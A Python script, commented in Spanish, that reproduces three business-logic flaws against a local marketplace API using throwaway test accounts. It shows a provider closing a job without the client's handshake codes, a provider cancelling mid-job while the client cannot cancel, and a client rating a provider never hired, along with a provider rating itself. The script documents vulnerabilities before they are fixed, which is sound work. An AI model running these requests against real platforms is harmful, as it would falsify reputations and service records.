# -*- coding: utf-8 -*-
"""Task 5.3 - evidencia "antes" de H1/H2/H3 contra el stack local.

Datos con prefijo smoke_ (AGENTS 13). No toca cuentas reales: atacante y
victima son cuentas creadas por este mismo script.
"""
import requests, random, time, json, sys

B = "http://localhost:8085/api"
S = random.randint(100000, 999999)
LOG = []

def out(linea=""):
    print(linea)
    LOG.append(linea)

def call(method, path, tok=None, **kw):
    h = kw.pop("headers", {}); h["Accept"] = "application/json"
    if tok: h["Authorization"] = "Bearer " + tok
    r = requests.request(method, B + path, headers=h, timeout=30, **kw)
    try: return r.status_code, r.json()
    except Exception: return r.status_code, {"_raw": r.text[:300]}

def reg(role, tag):
    pl = {"name": "smoke " + tag + " " + str(S),
          "email": "smoke_" + tag + "_" + str(S) + "@test.gt",
          "password": "secret123", "role": role}
    for _ in range(10):
        c, b = call("POST", "/register", json=pl)
        if c != 429: break
        time.sleep(int(b.get("retry_after", 20)) + 1)
    if c != 201:
        out("REGISTRO FALLO " + str(c) + " " + str(b)); sys.exit(1)
    return b["token"], b["user"]["id"]

def perfil(tok, tag, cat):
    c, b = call("POST", "/providers", tok, json={
        "nombre": "smoke " + tag + " " + str(S),
        "email": "smoke_perfil_" + tag + "_" + str(S) + "@test.gt",
        "departamento": "Guatemala", "categoria_id": cat, "nivel": "experto",
        "descripcion": "Perfil de evidencia para la matriz de seguridad."})
    return b["proveedor"]["id"]

out("=" * 72)
out("Evidencia ANTES - matriz H1/H2/H3 - corrida smoke " + str(S))
out("=" * 72)

c, b = call("GET", "/categorias")
cat = (b.get("categorias") or b.get("data"))[0]["id"]

# ══ H1 — cierre del servicio sin los codigos del handshake ══════════════════
out("")
out("H1 - Bypass del handshake por PUT /api/servicios/{id}/estado")
out("-" * 72)

tok_cli, id_cli = reg("cliente", "h1cli")
tok_pro, id_pro = reg("proveedor", "h1pro")
prov_h1 = perfil(tok_pro, "h1", cat)

c, b = call("POST", "/servicios", tok_cli, json={
    "proveedor_id": prov_h1, "descripcion": "Servicio de evidencia H1", "direccion": "Zona 10"})
srv = b["servicio"]["id"]
c, b = call("POST", "/servicios/" + str(srv) + "/aceptar", tok_pro)
out("  estado tras aceptar                     : " + b["servicio"]["estado"])

c, b = call("PUT", "/servicios/" + str(srv) + "/estado", tok_pro, json={"estado": "completado"})
out("  PUT /estado {completado} por proveedor  : HTTP " + str(c))
c, b = call("GET", "/servicios/" + str(srv), tok_cli)
est = b["servicio"]["estado"]
out("  estado visto por el cliente             : " + est)
out("  -> el cliente nunca entrego codigo_inicio ni confirmo codigo_fin")

c, b = call("POST", "/servicios/" + str(srv) + "/calificar", tok_cli,
            json={"puntuacion": 5, "comentario": "smoke evidencia"})
out("  queda calificable                       : HTTP " + str(c))

c, b = call("PUT", "/servicios/" + str(srv) + "/estado", tok_pro, json={"estado": "cancelado"})
c2, b2 = call("GET", "/servicios/" + str(srv), tok_cli)
out("  completado -> cancelado (terminal)      : HTTP " + str(c) + " | estado " + b2["servicio"]["estado"])
h1 = (est == "completado")
out("  VEREDICTO H1                            : " + ("REPRODUCIDO" if h1 else "no reproducido"))

# ══ H2 — el cliente no puede cancelar ═══════════════════════════════════════
out("")
out("H2 - Ausencia de cancelacion del cliente")
out("-" * 72)

tok_cli2, _ = reg("cliente", "h2cli")
tok_pro2, _ = reg("proveedor", "h2pro")
prov_h2 = perfil(tok_pro2, "h2", cat)
c, b = call("POST", "/servicios", tok_cli2, json={
    "proveedor_id": prov_h2, "descripcion": "Servicio de evidencia H2", "direccion": "Zona 1"})
srv2 = b["servicio"]["id"]

c, _ = call("POST", "/servicios/" + str(srv2) + "/cancelar", tok_cli2)
out("  POST /servicios/{id}/cancelar (cliente) : HTTP " + str(c) + "  (ruta inexistente)")
c, b = call("PUT", "/servicios/" + str(srv2) + "/estado", tok_cli2, json={"estado": "cancelado"})
out("  PUT /estado {cancelado} por el cliente  : HTTP " + str(c) + "  " + str(b.get("message", ""))[:45])

c, b = call("POST", "/servicios/" + str(srv2) + "/aceptar", tok_pro2)
c, b = call("POST", "/servicios/" + str(srv2) + "/iniciar", tok_pro2,
            json={"codigo": call("GET", "/servicios/" + str(srv2), tok_cli2)[1]["servicio"]["codigo_inicio"]})
out("  estado tras iniciar                     : " + str((b.get("servicio") or {}).get("estado")))
c, b = call("PUT", "/servicios/" + str(srv2) + "/estado", tok_pro2, json={"estado": "cancelado"})
c2, b2 = call("GET", "/servicios/" + str(srv2), tok_cli2)
out("  proveedor cancela en pleno trabajo      : HTTP " + str(c) + " | estado " + b2["servicio"]["estado"])
h2 = (b2["servicio"]["estado"] == "cancelado")
out("  VEREDICTO H2                            : " + ("REPRODUCIDO" if h2 else "no reproducido"))

# ══ H3 — destinatario arbitrario en POST /api/calificaciones ════════════════
out("")
out("H3 - Destinatario arbitrario en POST /api/calificaciones")
out("-" * 72)

tok_cli3, id_cli3 = reg("cliente", "h3cli")
tok_proA, id_proA = reg("proveedor", "h3proA")
tok_proB, id_proB = reg("proveedor", "h3proB")
provA = perfil(tok_proA, "h3A", cat)
provB = perfil(tok_proB, "h3B", cat)

# El cliente completa un servicio LEGITIMO con el proveedor A.
c, b = call("POST", "/servicios", tok_cli3, json={
    "proveedor_id": provA, "descripcion": "Servicio legitimo con el proveedor A", "direccion": "Zona 4"})
srv3 = b["servicio"]["id"]
call("POST", "/servicios/" + str(srv3) + "/aceptar", tok_proA)
cod = call("GET", "/servicios/" + str(srv3), tok_cli3)[1]["servicio"]["codigo_inicio"]
call("POST", "/servicios/" + str(srv3) + "/iniciar", tok_proA, json={"codigo": cod})
c, b = call("POST", "/servicios/" + str(srv3) + "/finalizar", tok_proA)
codf = b["codigo_fin"]
call("POST", "/servicios/" + str(srv3) + "/confirmar-fin", tok_cli3, json={"codigo": codf})
out("  servicio legitimo cliente <-> proveedor A completado")

c, b = call("GET", "/providers/" + str(provB))
antes = b["proveedor"]
out("  reputacion de B ANTES                   : promedio "
    + str(antes.get("calificacion_promedio")) + " | total " + str(antes.get("total_calificaciones")))

# Ataque: calificacion valida por autoria, destinatario ajeno al servicio.
c, b = call("POST", "/calificaciones", tok_cli3, json={
    "servicio_id": srv3, "destinatario_id": id_proB,
    "puntuacion": 1, "comentario": "smoke evidencia H3"})
out("  POST /calificaciones destinatario=B     : HTTP " + str(c) + "  " + str(b.get("message", ""))[:40])

c, b = call("GET", "/providers/" + str(provB))
desp = b["proveedor"]
out("  reputacion de B DESPUES                 : promedio "
    + str(desp.get("calificacion_promedio")) + " | total " + str(desp.get("total_calificaciones")))

h3 = (desp.get("total_calificaciones") != antes.get("total_calificaciones"))
out("  -> el cliente nunca contrato a B; A no recibio la calificacion")
out("  VEREDICTO H3                            : " + ("REPRODUCIDO" if h3 else "no reproducido"))

# Autocalificacion del proveedor sobre su propio servicio.
c, b = call("POST", "/calificaciones", tok_proA, json={
    "servicio_id": srv3, "destinatario_id": id_proA,
    "puntuacion": 5, "comentario": "smoke autocalificacion"})
c2, b2 = call("GET", "/providers/" + str(provA))
out("  proveedor A se califica a si mismo      : HTTP " + str(c)
    + " | su promedio " + str(b2["proveedor"].get("calificacion_promedio"))
    + " | total " + str(b2["proveedor"].get("total_calificaciones")))

out("")
out("=" * 72)
out("Resumen: H1=" + ("REPRODUCIDO" if h1 else "no")
    + "  H2=" + ("REPRODUCIDO" if h2 else "no")
    + "  H3=" + ("REPRODUCIDO" if h3 else "no"))
out("=" * 72)

with open("antes_53_salida.txt", "w", encoding="utf-8") as f:
    f.write("\n".join(LOG) + "\n")
